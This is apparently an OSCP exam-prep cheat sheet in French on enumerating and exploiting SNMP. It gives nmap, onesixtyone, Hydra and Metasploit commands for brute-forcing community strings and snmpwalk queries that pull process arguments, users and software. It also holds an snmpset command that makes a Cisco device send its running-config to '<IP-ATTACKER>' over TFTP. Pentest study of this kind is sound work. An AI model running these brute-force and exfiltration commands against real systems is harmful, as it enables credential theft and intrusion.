# OSCP Cheatsheet — Exploitation SNMP

> Notes de révision OSCP — énumération et exploitation du service SNMP (UDP 161/162).

---

## Rappel rapide

| Port | Protocole | Usage |
|------|-----------|-------|
| **161/UDP** | SNMP | Requêtes GET/SET/WALK |
| **162/UDP** | SNMP Trap | Notifications envoyées par les agents |
| **10161/TCP** | SNMP over TLS | Rare mais existe |

### Versions
- **v1** → community string en clair, pas d'auth
- **v2c** → identique à v1 + bulk requests (le plus courant en pentest)
- **v3** → authentification + chiffrement (beaucoup plus dur à attaquer)

### Community strings (v1/v2c)
- `public` → lecture (RO) — **le grand classique**
- `private` → lecture/écriture (RW) — **le jackpot**
- Autres à tester : `manager`, `admin`, `cisco`, `community`, nom d'entreprise…

---

# 1. Découverte et énumération

## 1.1 Nmap

```bash
# Scan UDP (LENT, prévoir du temps)
nmap -sU -p 161 <IP>

# Avec scripts NSE
nmap -sU -p 161 --script snmp-info,snmp-interfaces,snmp-netstat,snmp-processes,snmp-sysdescr,snmp-win32-services,snmp-win32-shares,snmp-win32-software,snmp-win32-users <IP>

# Scan rapide UDP top ports
nmap -sU --top-ports 20 <IP>
```

⚠️ **Toujours faire un scan UDP** en OSCP — SNMP passe inaperçu si on ne scanne que TCP.

## 1.2 Brute-force de community string

### Avec `onesixtyone` (rapide, incontournable)
```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <IP>

# Sur plusieurs hôtes
onesixtyone -c community.txt -i hosts.txt
```

### Avec Hydra
```bash
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <IP> snmp
```

### Avec Metasploit
```
use auxiliary/scanner/snmp/snmp_login
set RHOSTS <IP>
set PASS_FILE /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt
run
```

---

# 2. Récupération d'informations avec snmpwalk

## 2.1 Commandes de base

```bash
# Walk complet (peut être TRÈS long)
snmpwalk -v 2c -c public <IP>

# Walk sur une branche spécifique
snmpwalk -v 2c -c public <IP> <OID>

# Avec traduction lisible des OID (nécessite les MIBs)
snmpwalk -v 2c -c public <IP> -O a
```

## 2.2 OIDs essentielles à connaître par cœur

| OID | Description |
|-----|-------------|
| `1.3.6.1.2.1.1.1.0` | System description (OS, version, kernel) |
| `1.3.6.1.2.1.1.5.0` | Hostname |
| `1.3.6.1.2.1.25.1.6.0` | Nombre de processus |
| `1.3.6.1.2.1.25.4.2.1.2` | **Processus en cours d'exécution** |
| `1.3.6.1.2.1.25.4.2.1.4` | Chemins des exécutables |
| `1.3.6.1.2.1.25.4.2.1.5` | **Paramètres de ligne de commande** (⚠️ souvent des creds !) |
| `1.3.6.1.4.1.8072.1.3.2` | ou NET-SNMP-EXTEND-MIB::nsExtendObjects (⚠️⚠️a marchait dans les labs) |
| `1.3.6.1.2.1.25.6.3.1.2` | Logiciels installés |
| `1.3.6.1.2.1.6.13.1.3` | **Ports TCP en écoute** |
| `1.3.6.1.2.1.25.2.3.1.4` | Unités de stockage |
| `1.3.6.1.4.1.77.1.2.25` | **Utilisateurs Windows** |
| `1.3.6.1.4.1.77.1.2.3.1.1` | Sessions utilisateurs |
| `1.3.6.1.2.1.55.1.5.1.2` | Interfaces réseau |
| `1.3.6.1.4.1.9.9.23.1.2.1.1.4` | Voisins CDP (matériel Cisco) |
| `1.3.6.1.4.1.9.2.1.55` | **Config Cisco via TFTP** |

## 2.3 Extractions ciblées ultra-utiles

```bash
# Version de l'OS
snmpwalk -v 2c -c public <IP> 1.3.6.1.2.1.1.1.0

# Hostname
snmpwalk -v 2c -c public <IP> 1.3.6.1.2.1.1.5.0

# Processus (souvent des services vulnérables visibles ici)
snmpwalk -v 2c -c public <IP> 1.3.6.1.2.1.25.4.2.1.2

# Lignes de commandes complètes ( souvent des mots de passe en clair)
snmpwalk -v 2c -c public <IP> 1.3.6.1.2.1.25.4.2.1.5

# Logiciels installés
snmpwalk -v 2c -c public <IP> 1.3.6.1.2.1.25.6.3.1.2

# Ports TCP en écoute
snmpwalk -v 2c -c public <IP> 1.3.6.1.2.1.6.13.1.3

# Utilisateurs Windows (⚠️ SNMP Windows uniquement)
snmpwalk -v 2c -c public <IP> 1.3.6.1.4.1.77.1.2.25
```

## 2.4 Autres commandes SNMP

```bash
# Récupérer une seule valeur
snmpget -v 2c -c public <IP> 1.3.6.1.2.1.1.5.0

# Modifier une valeur (nécessite community RW)
snmpset -v 2c -c private <IP> <OID> <type> <value>
# Types : i (int), s (string), a (IP), x (hex)
```

---

# 3. Outils spécialisés

## 3.1 snmp-check (le préféré pour un rapport lisible)
```bash
snmp-check <IP>
snmp-check <IP> -c public -v 2c
```
Renvoie un rapport propre : hostname, users, réseau, processus, softwares, storage.

## 3.2 snmpenum
```bash
snmpenum <IP> public windows.txt
snmpenum <IP> public linux.txt
```

## 3.3 nmap scripts dédiés
```bash
nmap -sU -p 161 --script "snmp-*" <IP>
```

## 3.4 braa (bulk query très rapide)
```bash
braa public@<IP>:.1.3.6.*
```

---

# 4. Cas particuliers Windows

Si l'hôte est **Windows** avec le service SNMP activé, tu peux extraire :

```bash
# Utilisateurs locaux
snmpwalk -v 2c -c public <IP> 1.3.6.1.4.1.77.1.2.25 | cut -d" " -f4

# Services Windows
snmpwalk -v 2c -c public <IP> 1.3.6.1.4.1.77.1.2.3.1.1

# Partages
snmpwalk -v 2c -c public <IP> 1.3.6.1.4.1.77.1.2.27

# Programmes installés
snmpwalk -v 2c -c public <IP> 1.3.6.1.2.1.25.6.3.1.2
```

Ces informations sont **de l'or** pour préparer un brute-force SMB ou identifier un service vulnérable.

---

# 5. Cas particuliers Cisco / équipements réseau

SNMP est souvent utilisé pour la gestion Cisco → possibilité de **récupérer la config complète du switch/router**.

## 5.1 Récupération de config via SNMP + TFTP

Si tu as la community **RW** :

```bash
# 1. Lancer un serveur TFTP local
sudo systemctl start tftpd-hpa
# ou : sudo atftpd --daemon --port 69 /tmp

# 2. Forcer le device à envoyer sa config
# Pour Cisco IOS :
snmpset -v 2c -c private <IP-CISCO> 1.3.6.1.4.1.9.9.96.1.1.1.1.2.111 i 1 \
        1.3.6.1.4.1.9.9.96.1.1.1.1.3.111 i 4 \
        1.3.6.1.4.1.9.9.96.1.1.1.1.4.111 i 1 \
        1.3.6.1.4.1.9.9.96.1.1.1.1.5.111 a "<IP-ATTACKER>" \
        1.3.6.1.4.1.9.9.96.1.1.1.1.6.111 s "running-config" \
        1.3.6.1.4.1.9.9.96.1.1.1.1.14.111 i 4
```


---

# 6. Workflow-type OSCP « SNMP exposé »

1. **Scan UDP** avec Nmap → détecter 161/UDP
2. **Brute community** avec `onesixtyone` (souvent `public`)
3. **snmp-check** pour un vue d'ensemble rapide
4. **snmpwalk ciblé** sur les OIDs sensibles :
   - `1.3.6.1.2.1.25.4.2.1.5` → **arguments de ligne de commande** (creds en clair fréquents)
   - Users, ports en écoute, softwares installés
5. **Corréler** avec les autres services :
   - Users trouvés → brute SSH / SMB / RDP
   - Softwares identifiés → searchsploit pour trouver un CVE
   - Ports internes découverts → pivot possible
6. Si équipement Cisco + community RW → **exfiltration config via TFTP**

---

# 7. Pièges classiques à l'examen

- ❗ **UDP est souvent oublié** — SNMP n'apparaît pas dans un `nmap -sS` classique
- ❗ **Toujours essayer `private` en plus de `public`** — la community RW est rare mais dévastatrice
- ❗ Les **arguments de ligne de commande** (OID `1.3.6.1.2.1.25.4.2.1.5`) contiennent régulièrement `mysql -u root -pMotDePasse123` → penser à toujours les checker
- ❗ Ne pas rester bloqué sur v3 — si tu vois v3, tente quand même une v2c en aveugle, certains agents laissent les deux actifs
- ❗ `snmpwalk` complet peut prendre 5-10 min → mieux vaut cibler des OIDs précises
- ❗ Sur Windows, l'énum SNMP peut donner des **users que tu ne trouverais pas via SMB null-session**

---

# 8. Wordlists communautés

```
/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt
/usr/share/seclists/Discovery/SNMP/snmp.txt
/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt
```

---

# 9. Résolution des OIDs (MIBs)

Par défaut, `snmpwalk` renvoie des chiffres. Pour avoir des noms lisibles :

```bash
# Installer les MIBs
sudo apt install snmp-mibs-downloader
sudo download-mibs

# Puis éditer /etc/snmp/snmp.conf et commenter :
# mibs :

# Vérifier
snmpwalk -v 2c -c public <IP> system
```

---

# 10. Outils à avoir installés

| Outil | Usage |
|-------|-------|
| `snmp` (snmpwalk, snmpget, snmpset) | Interaction directe |
| `onesixtyone` | Brute-force community très rapide |
| `snmp-check` | Rapport lisible complet |
| `snmpenum` | Énum ciblée par OS |
| `braa` | Bulk query rapide |
| `nmap` (scripts snmp-*) | Énumération intégrée |
| `msfconsole` | Modules `auxiliary/scanner/snmp/*` et `cisco_config_tftp` |

---

